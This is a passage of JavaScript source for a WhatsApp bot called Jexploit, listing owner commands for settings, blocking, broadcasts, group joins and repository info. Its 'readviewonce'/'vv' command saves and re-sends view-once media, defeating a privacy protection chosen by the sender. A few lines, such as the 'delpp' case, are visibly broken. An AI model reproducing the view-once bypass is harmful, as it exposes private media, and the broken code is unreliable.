case 'readviewonce': case 'vv': {
if (!Access) return reply(mess.owner) 
    try {
        if (!m.quoted) return reply('*Please reply to a viewonce Media!*');

        const quotedMessage = m.msg.contextInfo.quotedMessage;
        if (!quotedMessage) return reply('❌ No media found in the quoted message.');

        if (quotedMessage.imageMessage) {
            let imageCaption = quotedMessage.imageMessage.caption || '';
            let imageUrl = await conn.downloadAndSaveMediaMessage(quotedMessage.imageMessage);
            await conn.sendMessage(m.chat, { image: { url: imageUrl }, caption: imageCaption });
        }

        if (quotedMessage.videoMessage) {
            let videoCaption = quotedMessage.videoMessage.caption || '';
            let videoUrl = await conn.downloadAndSaveMediaMessage(quotedMessage.videoMessage);
            await conn.sendMessage(m.chat, { video: { url: videoUrl }, caption: videoCaption });
        }

        if (quotedMessage.audioMessage) {
            let audioUrl = await conn.downloadAndSaveMediaMessage(quotedMessage.audioMessage);
            await conn.sendMessage(m.chat, { audio: { url: audioUrl }, mimetype: 'audio/mp4' });
        }

    } catch (error) {
        console.error('Error processing vv command:', error);
        reply('❌ An error occurred while processing your request.');
    }
    
}
break
case "listblocked": {
if (!Access) return reply(mess.owner);

    try {
      const blockedList = await conn.fetchBlocklist();

      if (!blockedList.length) {
        return reply('✅ No contacts are currently blocked.');
      }

      let blockedUsers = blockedList.map((user, index) => `🔹 *${index + 1}.* @${user.split('@')[0]}`).join('\n');

      await conn.sendMessage(m.chat, {
        text: `🚫 *Blocked Contacts:*\n\n${blockedUsers}`,
        mentions: blockedList
      }, { quoted: m });

    } catch (error) {
      reply('⚠️ Unable to fetch blocked contacts.');
  }
}
break
case "unblock": {
if (!Access) return reply(mess.owner);
    if (!m.quoted && !m.mentionedJid[0] && !text) return reply("Reply to a message or mention/user ID to unblock");

    const userId = m.mentionedJid[0] || m.quoted?.sender || text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    await conn.updateBlockStatus(userId, "unblock");
    reply(mess.done);
}
break
case "restart":
case "reboot": {
    if (!Access) return reply(mess.owner);
    
    try {
        await reply(`*Restarting ${global.botname} Bot...*\n\nPlease wait 10-15 seconds for the bot to restart.`);
        
        // A small delay to ensure the message is sent
        await sleep(2000);
        
        // Close the connection gracefully first
        if (conn && typeof conn.end === 'function') {
            await conn.end();
        }
        
        console.log(chalk.yellow.bold(`Bot restart initiated by ${pushname} (${m.sender})`));
        
        // Restart the process
        process.exit(0);
        
    } catch (error) {
        console.error('Error during restart:', error);
        reply('❌ *Failed to restart bot.* Please restart manually.');
    }
}
break
case "addignorelist": {
if (!Access) return reply(mess.owner);

    let mentionedUser = m.mentionedJid && m.mentionedJid[0];
    let quotedUser = m.quoted && m.quoted.sender;
    let userToAdd = mentionedUser || quotedUser || m.chat;

    if (!userToAdd) return reply('Mention a user, reply to their message, or provide a phone number to ignore.');

    let blacklist = loadBlacklist();
    if (!blacklist.blacklisted_numbers.includes(userToAdd)) {
        blacklist.blacklisted_numbers.push(userToAdd);
        reply(`${userToAdd} added to the ignore list.`);
    } else {
        reply(`${userToAdd} is already ignored.`);
    }
}
break
case "delignorelist": {
    if (!Access) return reply(mess.owner);

    let mentionedUser = m.mentionedJid && m.mentionedJid[0];
    let quotedUser = m.quoted && m.quoted.sender;
    let userToRemove = mentionedUser || quotedUser || m.chat;

    if (!userToRemove) return reply('Mention a user, reply to their message, or provide a phone number to remove from the ignore list.');

    let blacklist = loadBlacklist();
    let index = blacklist.blacklisted_numbers.indexOf(userToRemove);
    if (index !== -1) {
        blacklist.blacklisted_numbers.splice(index, 1);
        reply(`${userToRemove} removed from the ignore list.`);
    } else {
        reply(`${userToRemove} is not in the ignore list.`);
    }
}
break
case "listignored": {
let blacklist = loadBlacklist();
    if (blacklist.blacklisted_numbers.length === 0) {
        reply('The ignore list is empty.');
    } else {
        reply(`Ignored users/chats:\n${blacklist.blacklisted_numbers.join('\n')}`);
    }
}
break
case "deletejunk": 
case "deljunk": {
if (!Access) return reply(mess.owner);
    fsp.readdir("./session", async function (err, files) {
      if (err) {
        console.log("Unable to scan directory: " + err);
        return reply("Unable to scan directory: " + err);
      }
      let filteredArray = await files.filter(
        (item) =>
          item.startsWith("pre-key") ||
          item.startsWith("sender-key") ||
          item.startsWith("session-") ||
          item.startsWith("app-state")
      );
      console.log(filteredArray.length);
      await sleep(2000);
      reply(`*Clearing ${filteredArray.length} junk files in the session folder...*`);
      await filteredArray.forEach(function (file) {
        fs.unlinkSync(`./session/${file}`);
      });
      await sleep(2000);
      reply("*Successfully cleared all the junk files in the session's folder*");
    });

    const tmpDir = path.resolve("./tmp");
    fsp.readdir(tmpDir, async function (err, files) {
      if (err) {
        console.log("Unable to scan directory: " + err);
        return reply("Unable to scan directory: " + err);
      }
      let junkFiles = files.filter(
        (item) =>
          item.endsWith("gif") ||
          item.endsWith("png") || 
          item.endsWith("mp3") ||
          item.endsWith("mp4") || 
          item.endsWith("opus") || 
          item.endsWith("jpg") ||
          item.endsWith("webp") ||
          item.endsWith("webm") ||
          item.endsWith("zip")
      );
      console.log(junkFiles.length);
      await sleep(2000);
      reply(`*Clearing ${junkFiles.length} junk files in the tmp folder...*`);
      await junkFiles.forEach(function (file) {
        fs.unlinkSync(`${tmpDir}/${file}`);
      });
      await sleep(2000);
      reply("*Successfully cleared all the junk files in the tmp folder*");
    });
}
break
case "cleansession":
case "cleanjunk":
case "clean": {
    if (!Access) return reply(mess.owner);
    
    try {
        reply("*Starting session cleanup...*");
        
        // Clean session files using your function
        cleaningSession("./session");
        
        // Wait and send success message
        setTimeout(() => {
            reply("✅ *Session files cleaned successfully!*\n\n" +
                  "• Removed old session files (>2 hours)\n" +
                  "• Preserved credentials (creds.json)\n" +
                  "• Temporary files cleared");
        }, 2000);
        
    } catch (error) {
        console.error("Error in cleansession command:", error);
        reply("*Error: " + error.message + "*");
    }
    
}
break
case 'autoviewstatus':
case 'viewstatus': {
    if (!Access) return reply(mess.owner);
    
    const mode = args[0]?.toLowerCase();
    if (!mode || !['on', 'off'].includes(mode)) {
        const current = await db.get(botNumber, 'autoviewstatus', false);
        return reply(`Usage: ${prefix}autoviewstatus <on/off>\n\nCurrent: ${current ? 'ON ✅' : 'OFF ❌'}`);
    }
    
    const boolValue = mode === 'on';
    await db.set(botNumber, 'autoviewstatus', boolValue);
    reply(`✅ Auto-view status ${boolValue ? 'enabled' : 'disabled'}`);
    break;
}
case 'autoreactstatus':
case 'reactstatus': {
    if (!Access) return reply(mess.owner);
    
    const mode = args[0]?.toLowerCase();
    if (!mode || !['on', 'off'].includes(mode)) {
        const current = await db.get(botNumber, 'autoreactstatus', false);
        return reply(`Usage: ${prefix}autoreactstatus <on/off>\n\nCurrent: ${current ? 'ON ✅' : 'OFF ❌'}`);
    }
    
    const boolValue = mode === 'on';
    await db.set(botNumber, 'autoreactstatus', boolValue);
    reply(`✅ Auto-react status ${boolValue ? 'enabled' : 'disabled'}`);
    break;
}
case 'statusemoji':
case 'setstatusemoji': {
    if (!Access) return reply(mess.owner);
    
    const emoji = args[0];
    if (!emoji) {
        const current = await db.get(botNumber, 'statusemoji', '💚');
        return reply(`Usage: ${prefix}statusemoji <emoji>\n\nCurrent: ${current}\nExample: ${prefix}statusemoji ❤️`);
    }
    
    await db.set(botNumber, 'statusemoji', emoji);
    reply(`✅ Status reaction emoji set to: ${emoji}`);
    break;
}
case 'welcome': {
    if (!m.isGroup) return reply(mess.group);
    if (!m.isAdmin && !Access) return reply(mess.notadmin);
    
    const mode = args[0]?.toLowerCase();
    if (!mode || !['on', 'off'].includes(mode)) {
        const current = await db.getGroupSetting(botNumber, m.chat, 'welcome', false);
        return reply(`❌ Usage: ${prefix}welcome <on/off>\n\nCurrent: ${current ? 'ON ✅' : 'OFF ❌'}`);
    }
    
    const boolValue = mode === 'on';
    await db.setGroupSetting(botNumber, m.chat, 'welcome', boolValue);
    reply(`✅ Welcome messages ${boolValue ? 'enabled' : 'disabled'} for this group`);
    break;
}
case 'adminevent': {
    if (!Access) return reply(mess.owner);
    
    const mode = args[0]?.toLowerCase();
    if (!mode || !['on', 'off'].includes(mode)) {
        const current = await db.get(botNumber, 'adminevent', false);
        return reply(`❌ Usage: ${prefix}adminevent <on/off>\n\nCurrent: ${current ? 'ON ✅' : 'OFF ❌'}`);
    }
    
    const boolValue = mode === 'on';
    await db.set(botNumber, 'adminevent', boolValue);
    reply(`✅ Admin event notifications ${boolValue ? 'enabled' : 'disabled'}`);
    break;
}
case 'anticall': {
    if (!Access) return reply(mess.owner);
    
    const mode = args[0]?.toLowerCase();
    const action = args[1]?.toLowerCase();
    
    // Show help if no arguments
    if (!mode) {
        const current = await db.get(botNumber, 'anticall', 'off');
        return reply(`*ANTICALL*\n\n` +
            `• ${prefix}anticall decline on\n` +
            `• ${prefix}anticall decline off\n` +
            `• ${prefix}anticall block on\n` +
            `• ${prefix}anticall block off\n\n` +
            `Current: ${current}`);
    }
    
    // Handle decline mode
    if (mode === 'decline') {
        if (action === 'on') {
            await db.set(botNumber, 'anticall', 'decline');
            return reply('✅ *Successfully enabled anticall decline mode*');
        }
        if (action === 'off') {
            await db.set(botNumber, 'anticall', 'off');
            return reply('❌ Anticall OFF');
        }
    }
    
    // Handle block mode
    if (mode === 'block') {
        if (action === 'on') {
            await db.set(botNumber, 'anticall', 'block');
            return reply('✅ *Successfully enabled anticall block mode*');
        }
        if (action === 'off') {
            await db.set(botNumber, 'anticall', 'off');
            return reply('✅ Successfully disabled anticall');
        }
    }
    
    // Invalid command
    reply('❌ Use: .anticall decline on/off or .anticall block on/off');
    break;
}
case "settings":
case "botsettings":
case "status": {
    if (!Access) return reply(mess.owner);
    
    // Fetch all settings from SQLite
    const [
        prefix,
        alwaysonline,
        antidelete,
        antiedit,
        anticall,
        antilinkdelete,
        antilinkaction,
        antibadword,
        antibadwordaction,
        antitag,
        antitagaction,
        autorecording,
        autoTyping,
        autoread,
        autoreact,
        AI_CHAT,
        autoviewstatus,
        autoreactstatus,
        statusemoji,
        welcome,
        adminevent
    ] = await Promise.all([
        db.get(botNumber, 'prefix', '.'),
        db.get(botNumber, 'alwaysonline', false),
        db.get(botNumber, 'antidelete', 'off'),
        db.get(botNumber, 'antiedit', 'off'),
        db.get(botNumber, 'anticall', 'off'),
        db.get(botNumber, 'antilink', false),
        db.get(botNumber, 'antilinkaction', 'delete'),
        db.get(botNumber, 'antibadword', false),
        db.get(botNumber, 'antibadwordaction', 'delete'),
        db.get(botNumber, 'antitag', false),
        db.get(botNumber, 'antitagaction', 'delete'),
        db.get(botNumber, 'autorecording', false),
        db.get(botNumber, 'autoTyping', false),
        db.get(botNumber, 'autoread', false),
        db.get(botNumber, 'autoreact', false),
        db.get(botNumber, 'AI_CHAT', false),
        db.get(botNumber, 'autoviewstatus', false),
        db.get(botNumber, 'autoreactstatus', false),
        db.get(botNumber, 'statusemoji', '💚'),
        db.get(botNumber, 'welcome', false),
        db.get(botNumber, 'adminevent', false)
    ]);

    let settingsMsg = `*📊 BOT SETTINGS STATUS*\n\n`;
    settingsMsg += `🔸 Prefix: ${prefix}\n`;
    settingsMsg += `🔸 Always Online: ${alwaysonline ? 'True' : 'False'}\n`;
    settingsMsg += `🔸 Anti-Delete: ${antidelete !== 'off' ? 'True (' + antidelete + ')' : 'False'}\n`;
    settingsMsg += `🔸 Anti-Edit: ${antiedit !== 'off' ? 'True (' + antiedit + ')' : 'False'}\n`;
    settingsMsg += `🔸 Anti-Call: ${anticall !== 'off' ? 'True (' + anticall + ')' : 'False'}\n`;
    settingsMsg += `🔸 Anti-Link: ${antilinkdelete ? 'True (' + antilinkaction + ')' : 'False'}\n`;
    settingsMsg += `🔸 Anti-Badword: ${antibadword ? 'True (' + antibadwordaction + ')' : 'False'}\n`;
    settingsMsg += `🔸 Anti-Tag: ${antitag ? 'True (' + antitagaction + ')' : 'False'}\n`;
    settingsMsg += `🔸 Auto-Recording: ${autorecording ? 'True' : 'False'}\n`;
    settingsMsg += `🔸 Auto-Typing: ${autoTyping ? 'True' : 'False'}\n`;
    settingsMsg += `🔸 Auto-Read: ${autoread ? 'True' : 'False'}\n`;
    settingsMsg += `🔸 Auto-React: ${autoreact ? 'True' : 'False'}\n`;
    settingsMsg += `🔸 AI Chatbot: ${AI_CHAT ? 'True' : 'False'}\n`;
    settingsMsg += `🔸 Auto-View Status: ${autoviewstatus ? 'True' : 'False'}\n`;
    settingsMsg += `🔸 Auto-React Status: ${autoreactstatus ? 'True (' + statusemoji + ')' : 'False'}\n`;
    settingsMsg += `🔸 Welcome Message: ${welcome ? 'True' : 'False'}\n`;
    settingsMsg += `🔸 Admin Events: ${adminevent ? 'True' : 'False'}`;
    
    reply(settingsMsg);
    break;
}
case "getpp": {
    if (!Access) return reply(mess.owner);
    if (!m.quoted) {
        // React with 📷 even if no user is quoted
        await conn.sendMessage(m.chat, {
            react: {
                text: "📷",
                key: m.key
            }
        });
        return reply('Reply to a user to get their profile picture.');
    }

    // React with 📷 emoji to the command message
    await conn.sendMessage(m.chat, {
        react: {
            text: "📷",
            key: m.key
        }
    });

    const userId = m.quoted.sender;

    try {
        const ppUrl = await conn.profilePictureUrl(userId, 'image');

        await conn.sendMessage(m.chat, 
            { 
                image: { url: ppUrl }, 
                caption: `⌘ *Profile Picture of:* @${userId.split('@')[0]}`,
                mentions: [ userId ]
            }, { quoted: m }); 
    } catch {
        await conn.sendMessage(m.chat, { 
            image: { url: 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60' }, 
            caption: '⚠️ No profile picture found.' 
        }, { quoted: m });
    }
}
break
case "update":
case "botupdate":
case "upgrade": {
    if (!Access) return reply(mess.owner);
    
    try {
        const updateCommand = require('./lib/update');
        await updateCommand(conn, Access, m.chat, m);
    } catch (err) {
        console.error('Update error:', err);
        reply(`*Update failed:* ${err.message}`);
    }
    
}
break
case "toviewonce": {
if (!Access) return reply(mess.owner);
    if (!quoted) return reply(`*Reply to an Image or Video*`);

    if (/image/.test(mime)) {
      const anuan = await conn.downloadAndSaveMediaMessage(quoted);
      conn.sendMessage(
        m.chat,
        {
          image: { url: anuan },
          caption: mess.done,
          fileLength: "999",
          viewOnce: true
        },
        { quoted: m }
      );
    } else if (/video/.test(mime)) {
      const anuanuan = await conn.downloadAndSaveMediaMessage(quoted);
      conn.sendMessage(
        m.chat,
        {
          video: { url: anuanuan },
          caption: mess.done,
          fileLength: "99999999",
          viewOnce: true
        },
        { quoted: m }
      );
    } else if (/audio/.test(mime)) {
      const bebasap = await conn.downloadAndSaveMediaMessage(quoted);
      conn.sendMessage(m.chat, {
        audio: { url: bebasap },
        mimetype: "audio/mpeg",
        ptt: true,
        viewOnce: true
      });
   }
}
break
case "private": {
if (!Access) return reply(mess.owner) 
conn.public = false
reply(`*${global.botname} successfully changed to private mode*.`)
}
break
case "join": {
if (!Access) return reply(mess.owner);
    if (!text) return reply("Enter group link");
    if (!isUrl(args[0]) && !args[0].includes("whatsapp.com")) return reply("Invalid link");

    try {
      const link = args[0].split("https://chat.whatsapp.com/")[1];
      await conn.groupAcceptInvite(link);
      reply("Joined successfully");
    } catch {
      reply("Failed to join group");
    }
}
break
case "broadcast": {
if (!Access) return reply(mess.owner);
    if (args.length === 0) return reply("📢 Please provide a message to broadcast.");
    const message = args.join(' ');
    const groups = Object.keys(await conn.groupFetchAllParticipating());
    for (const groupId of groups) {
        await conn.sendMessage(groupId, { text: message }, { quoted: mek });
    }
    reply("📢 Message broadcasted to all groups.");
}
break
case "groupjids": {
    if (!Access) return reply(mess.owner);
    const groups = await conn.groupFetchAllParticipating();
    const groupJids = Object.keys(groups).join('\n');
    reply(`📝 *Group JIDs:*\n\n${groupJids}`);
}
break
case "request": {
if (!Access) return reply(mess.owner);
    if (!text) return reply(`Example: ${prefix + command} I would like a new feature (specify) to be added.`);

    const requestMsg = `
*REQUEST*

*User*: @${m.sender.split("@")[0]}
*Request*: ${text}

    `;

    const confirmationMsg = `
Hi ${m.pushName},

Your request has been forwarded to my developer.
Please wait for a reply.

*Details:*
${requestMsg}
    `;

    conn.sendMessage("256742932677@s.whatsapp.net", { text: requestMsg, mentions: [m.sender] }, { quoted: m });
    conn.sendMessage(m.chat, { text: confirmationMsg, mentions: [m.sender] }, { quoted: m });
}
break
case "reportbug": {
if (!Access) return reply(mess.owner);
    if (!text) return reply(`Example: ${prefix + command} Hey, play command isn't working`);

    const bugReportMsg = `
*BUG REPORT*

*User*: @${m.sender.split("@")[0]}
*Issue*: ${text}

    `;

    const confirmationMsg = `
Hi ${m.pushName},

Your bug report has been forwarded to my developer.
Please wait for a reply.

*Details:*
${bugReportMsg}
    `;

    conn.sendMessage("256742932677@s.whatsapp.net", { text: bugReportMsg, mentions: [m.sender] }, { quoted: m });
    conn.sendMessage(m.chat, { text: confirmationMsg, mentions: [m.sender] }, { quoted: m });
}
break
case "groupid": {
    if (!Access) return reply(mess.owner);
    if (!q) return reply('*Please provide a group link*!');
    
    let linkRegex = args.join(" ");
    let coded = linkRegex.split("https://chat.whatsapp.com/")[1];
    if (!coded) return reply("Link Invalid");

    conn.query({
      tag: "iq",
      attrs: {
        type: "get",
        xmlns: "w:g2",
        to: "@g.us"
      },
      content: [{ tag: "invite", attrs: { code: coded } }]
    }).then(async (res) => {
      const tee = `${res.content[0].attrs.id ? res.content[0].attrs.id : "undefined"}`;
      reply(tee + '@g.us');
    });
}
break
case 'autotyping':
case 'typing': {
    if (!Access) return reply(mess.owner);
    const autoTyping = await db.get(botNumber, 'autoTyping', false);
    
    if (!Access) return reply(mess.owner);
    
    const mode = args[0]?.toLowerCase();
    if (!mode || !['on', 'off'].includes(mode)) {
        return reply(`❌ Usage: ${prefix}autotyping <on/off>`);
    }
    
    const boolValue = mode === 'on';
    
    // Save to database (batched, efficient!)
    await db.set(botNumber, 'autoTyping', boolValue);
    
    reply(`✅ Auto-typing ${boolValue ? 'enabled' : 'disabled'}`);
    break;
}
case 'autoreact': {
    if (!Access) return reply(mess.owner);
    
    const mode = args[0]?.toLowerCase();
    if (!mode || !['on', 'off'].includes(mode)) {
        const current = await db.get(botNumber, 'autoreact', false);
        return reply(`❌ Usage: ${prefix}autoreact <on/off>\n\nCurrent: ${current ? 'ON ✅' : 'OFF ❌'}`);
    }
    
    const boolValue = mode === 'on';
    await db.set(botNumber, 'autoreact', boolValue);
    reply(`✅ Auto-react ${boolValue ? 'enabled' : 'disabled'}`);
    break;
}
case 'autoread': {
    if (!Access) return reply(mess.owner);
    
    const mode = args[0]?.toLowerCase();
    if (!mode || !['on', 'off'].includes(mode)) {
        const current = await db.get(botNumber, 'autoread', false);
        return reply(`❌ Usage: ${prefix}autoread <on/off>\n\nCurrent: ${current ? 'ON ✅' : 'OFF ❌'}`);
    }
    
    const boolValue = mode === 'on';
    await db.set(botNumber, 'autoread', boolValue);
    reply(`✅ Auto-read ${boolValue ? 'enabled' : 'disabled'}`);
    break;
}
case 'autorecord':
case 'autorecording': {
    if (!Access) return reply(mess.owner);
    
    const mode = args[0]?.toLowerCase();
    if (!mode || !['on', 'off'].includes(mode)) {
        const current = await db.get(botNumber, 'autorecording', false);
        return reply(`❌ Usage: ${prefix}autorecord <on/off>\n\nCurrent: ${current ? 'ON ✅' : 'OFF ❌'}`);
    }
    
    const boolValue = mode === 'on';
    await db.set(botNumber, 'autorecording', boolValue);
    reply(`✅ Auto-recording ${boolValue ? 'enabled' : 'disabled'}`);
    break;
}
case 'antigroupmention':
case 'antigpmention':
case 'agm': {
    if (!Access) return reply(mess.owner);
    if (!m.isAdmin) return reply(global.mess.notadmin);
    if (!m.isBotAdmin) return reply(global.mess.botadmin);
    
    const mode = args[0]?.toLowerCase();
    
    if (!mode || !['on', 'off'].includes(mode)) {
        const current = await db.get(botNumber, 'antigroupmention', false);
        return reply(`❌ *ANTI GROUP MENTION*\n\nCurrent: ${current ? 'ON ✅' : 'OFF ❌'}\n\n📌 *Usage:*\n${prefix}antigroupmention on\n${prefix}antigroupmention off`);
    }
    
    const boolValue = mode === 'on';
    await db.set(botNumber, 'antigroupmention', boolValue);
    
    reply(`✅ Anti Group Mention ${boolValue ? 'enabled' : 'disabled'}`);
    break;
}
case 'aichat':
case 'chatbot':
case 'aichatbot':
case 'setai': {
    if (!Access) return reply(mess.owner);
    
    const mode = args[0]?.toLowerCase();
    if (!mode || !['on', 'off'].includes(mode)) {
        const current = await db.get(botNumber, 'AI_CHAT', false);
        return reply(`❌ Usage: ${prefix}aichat <on/off>\n\nCurrent: ${current ? 'ON ✅' : 'OFF ❌'}`);
    }
    // Message memory for conversation context
   let messageMemory = new Map();
   const MAX_MEMORY = 150; // Maximum messages to remember per chat
   
    const boolValue = mode === 'on';
    await db.set(botNumber, 'AI_CHAT', boolValue);
    
    // Clear memory when turning off/on
    if (boolValue) {
        // Clear old memory when turning on
        messageMemory.clear();
    }
    
    reply(`✅ AI Chatbot ${boolValue ? 'enabled' : 'disabled'}`);
    
}
break
case 'deletepp':
case 'delpp': {
if (!Access) return reply(mess.owner);
conn.removeProfilePicture(conn.user.id)
("*Successfully deleted profile pic*")
}
break 
case "unblockall": {
    if (!Access) return reply(mess.owner);

    try {
      const blockedList = await conn.fetchBlocklist();
      if (!blockedList.length) return reply("✅ No blocked contacts to unblock.");

      for (const user of blockedList) {
        await conn.updateBlockStatus(user, "unblock");
      }

      reply(`✅ Successfully unblocked *${blockedList.length}* contacts.`);
    } catch (error) {
      reply("⚠️ Failed to unblock all contacts.");
    }
}
break
break
case "leave":
case "leavegc": {
if (!m.isGroup) return reply(mess.group);
if (!Access) return reply(mess.owner);
    reply("*Goodbye, it was nice being here!*");
    await sleep(3000);
    await conn.groupLeave(m.chat);
}
break
case "setbio": {
if (!Access) return reply(mess.owner);
if (!text) return reply(`*Text needed*\nExample: ${prefix + command} ${global.botname}`);

    await conn.updateProfileStatus(text);
    reply(`*Successfully updated bio to "${text}"*`);
}
break
case "p":
case "ping": {
const startTime = performance.now();

    try {
      const sentMessage = await conn.sendMessage(m.chat, {
        text: "🔸Pong!",
        contextInfo: { quotedMessage: m.message }
      });
      
      const endTime = performance.now();
      const latency = `${(endTime - startTime).toFixed(2)} ms`;
      
      await conn.sendMessage(m.chat, {
        text: `*🏓 ${global.botname} Speed:* ${latency}`,
        edit: sentMessage.key, 
        contextInfo: { quotedMessage: m.message }
      });

    } catch (error) {
      console.error('Error sending ping message:', error);
      await conn.sendMessage(m.chat, {
        text: 'An error occurred while trying to ping.',
        contextInfo: { quotedMessage: m.message }
      });
   }
}
break
case "up":
case "uptime": {
    const startTime = performance.now();

    try {
        const sentMessage = await conn.sendMessage(m.chat, {
            text: "⚡ Testing connection...",
            contextInfo: { quotedMessage: m.message }
        });
        
        const endTime = performance.now();
        const ping = `${(endTime - startTime).toFixed(2)}`;
        
        // Get SERVER uptime
        const serverUptime = getServerUptime();
        
        const botInfo = `🔸 *Uptime* : *${serverUptime}*`;
        
        await conn.sendMessage(m.chat, {
            text: botInfo,
            edit: sentMessage.key,
            contextInfo: { quotedMessage: m.message }
        });

    } catch (error) {
        console.error('❌ Uptime error:', error);
        await conn.sendMessage(m.chat, {
            text: `❌ Error: ${error.message}`,
            contextInfo: { quotedMessage: m.message }
        });
    }
}
break
case "sc": {
  try {
    // GitHub repository details
    const repoOwner = "Kevintech-hub";
    const repoName = "Jexploit-Bot";
    const apiUrl = `https://api.github.com/repos/${repoOwner}/${repoName}`;
    
    // Fetch repository data with error handling
    const { data } = await axios.get(apiUrl, {
      timeout: 5000, // 5 second timeout
      headers: {
        'User-Agent': 'Jexploit-Bot' // GitHub requires user-agent
      }
    }).catch(err => {
      console.error('GitHub API Error:', err);
      throw new Error('Failed to connect to GitHub API');
    });

    // Validate response data
    if (!data || typeof data !== 'object') {
      throw new Error('Invalid GitHub API response');
    }

    // Format repository information
    const repoInfo = `
    *BOT REPOSITORY*
    
 *Name:* ${String(data.name || repoName).padEnd(20)}
 *Stars:* ${String(data.stargazers_count || 0).padEnd(20)}
 *Forks:* ${String(data.forks_count || 0).padEnd(21)}
 *Watchers:* ${String(data.watchers_count || 0).padEnd(18)}
 *Language:* ${String(data.language || 'Not specified').padEnd(16)}
 *License:* ${String(data.license?.name || 'None').padEnd(19)}
 *GitHub Link:* 
https://github.com/${repoOwner}/${repoName}

*Session Id:* https://vinic-xmd-pairing-site-dsf-crew-devs.onrender.com/
────────────────────────────────
@${m.sender.split("@")[0]}👋, Don't forget to star and fork my repository!`;
    // Send the response with thumbnail
    await conn.sendMessage(
      m.chat,
      {
        text: repoInfo.trim(),
        contextInfo: {
          mentionedJid: [m.sender],
          externalAdReply: {
            title: "Jexploit Repository",
            body: `⭐ Star the repo to support development!`,
            thumbnail: await getBuffer('https://files.catbox.moe/uy3kq9.jpg'), // Fallback thumbnail
            mediaType: 1,
            sourceUrl: `https://github.com/${repoOwner}/${repoName}`
          }
        }
      },
      { quoted: m }
    );

  } catch (error) {
    console.error('Repo command error:', error);
    
    // Fallback response when GitHub API fails
    const fallbackInfo = `
    * BOT REPOSITORY *
    
 *Name:* Jexploit 
 *GitHub Link:* 
https://github.com/Kevintech-hub/Vinic-Xmd-

@${m.sender.split("@")[0]}👋, Visit the repository for more info!`;

    await conn.sendMessage(
      m.chat,
      { 
        text: fallbackInfo,
        contextInfo: {
          mentionedJid: [m.sender]
        }
      },
      { quoted: m }
    );
  }
}
break
case 'github':
case 'repo': {
    try {
        const githubCommand = require('./KelvinCmds/github');

        await githubCommand(conn, m.chat, m, buttonHandler);
    } catch (error) {
        console.error('Error in github command:', error);
        reply('❌ Error fetching repository information.');
    }
    
}
break
case "githubsearch":
case "ghsearch":
case "searchgithub": {
    if (!text) {
        return reply(`*🔍 GITHUB SEARCH*\n\nUsage: ${prefix}githubsearch <query>\nExample: ${prefix}githubsearch Kevintech-hub`);
    }

    await reply(`🔍 Searching GitHub for: ${text}...`);
    await conn.sendMessage(m.chat, { react: { text: "🔍", key: m.key } });

    try {
        const apiUrl = `https://api.nexray.eu.cc/search/github?q=${encodeURIComponent(text)}`;
        const response = await axios.get(apiUrl, { timeout: 15000 });
        const data = response.data;

        if (!data.status || !data.result || data.result.length === 0) {
            return reply(`❌ No results found for: "${text}"`);
        }

        const results = data.result.slice(0, 10);
        let message = `🔍 *GITHUB SEARCH RESULTS*\n📌 Query: ${text}\n📊 Found: ${data.result.length} results\n\n`;

        for (let i = 0; i < results.length; i++) {
            const item = results[i];
            const repo = item.repository;
            const file = item.file;
            const author = item.author;
            
            message += `*${i + 1}. ${file.name}*\n`;
            message += `📦 Repo: ${repo.full_name}\n`;
            message += `📝 Desc: ${repo.description || 'No description'}\n`;
            message += `⭐ Stars: ${repo.stars} | 🍴 Forks: ${repo.forks}\n`;
            message += `💻 Language: ${repo.language || 'N/A'}\n`;
            message += `👤 Author: ${author.name}\n`;
            message += `🔗 URL: ${repo.url}\n`;
            message += `📄 Raw: ${file.raw_url}\n\n`;
        }

        if (data.result.length > 10) {
            message += `_...and ${data.result.length - 10} more results_\n`;
        }

        await conn.sendMessage(m.chat, { text: message }, { quoted: m });
        await conn.sendMessage(m.chat, { react: { text: "✅", key: m.key } });

    } catch (error) {
        console.error('GitHub search error:', error);
        await conn.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
        reply(`❌ Failed to search GitHub: ${error.message}`);
    }
    
}
break
case "alive": {
     const serverUptime = getServerUptime();
    
    const imageUrls = [
        "./start/lib/Media/Jexploit1.jpg",
        "./start/lib/Media/Jexploit2.jpg"   
    ];
    
    // Array of audio URLs
    const audioUrls = [
        './start/lib/Media/JexAudio2.mp3',
        './start/lib/Media/JexAudio3.mp3',
        './start/lib/Media/JexAudio5.mp3',
        './start/lib/Media/JexAudio6.mp3'
    ];
    
    // Randomly select an image URL
    const randomImageUrl = imageUrls[Math.floor(Math.random() * imageUrls.length)];
    
    // Randomly select an audio URL
    const randomAudioUrl = audioUrls[Math.floor(Math.random() * audioUrls.length)];
    
    // Send the randomly selected image with caption
    await conn.sendMessage(
        m.chat, 
        { 
            image: { url: randomImageUrl },
            caption: `*🌹Hi. I am 👑 Jexploit, a friendly WhatsApp bot from Uganda 🇺🇬, created by Kevin tech. Don't worry, I'm still Alive☺🚀*\n\n*⏰ Uptime:${serverUptime}*`
        },
        { quoted: m }
    ).catch(err => {
        console.error('Image failed:', err.message);
        // Fallback if image fails
        return conn.sendMessage(m.chat, {
            text: `*🌹Hi. I am 👑 Jexploit, a friendly WhatsApp bot from Uganda 🇺🇬, created by Kevin tech. Don't worry, I'm still Alive☺🚀*\n\n*⏰ Uptime:${serverUptime}*`
        }, { quoted: m });
    });
    
    // Send the randomly selected audio as audio (not PTT)
    await conn.sendMessage(
        m.chat,
        {
            audio: { url: randomAudioUrl },
            mimetype: 'audio/mpeg'  
        },
        { quoted: m }
    ).catch(err => console.error('Audio failed:', err.message)); 
    
    break;
}

case 'botinfo': {
    const botInfo = `
╭─ ⌬ Bot Info
│ • Name     : ${botname}
│ • Owner    : ${ownername}
│ • Version  : ${global.versions}
│ • ᴄᴍᴅs    : 100+
│ • Developer: Kelvin tech
│ • Runtime  : ${runtime(process.uptime())}
╰─────────────`;

    const imageUrls = [
        "./start/lib/Media/Jexploit1.jpg", 
        "./start/lib/Media/Jexploit2.jpg"
    ];
    
    // Array of audio URLs
    const audioUrls = [
        './start/lib/Media/JexAudio1.mp3',
        './start/lib/Media/JexAudio2.mp3',
        './start/lib/Media/JexAudio3.mp3',
        './start/lib/Media/JexAudio8.mp3',
        './start/lib/Media/JexAudio4.mp3',
        './start/lib/Media/JexAudio5.mp3',
        './start/lib/Media/JexAudio6.mp3',
        './start/lib/Media/JexAudio7.mp3'
    ];
    
    const randomImageUrl = imageUrls[Math.floor(Math.random() * imageUrls.length)];
    
    // Randomly select an audio URL
